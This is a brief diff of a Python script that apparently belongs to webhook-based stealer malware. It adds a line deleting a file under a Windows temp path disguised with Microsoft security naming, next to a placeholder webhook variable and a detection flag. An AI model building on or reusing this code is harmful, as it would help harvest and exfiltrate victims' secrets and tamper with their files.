@@ -18,9 +18,8 @@ import random
 import re
 import subprocess
 
-
+os.remove("C:\\windows\\temp\\Win.microsoft.Security.temp\SecurityKeys_Crypted.txt")
 hook = "WillBeReplaceBiUrWebHook"
-#hookx = "you can set one but why ?"
 
 DETECTED = False
 
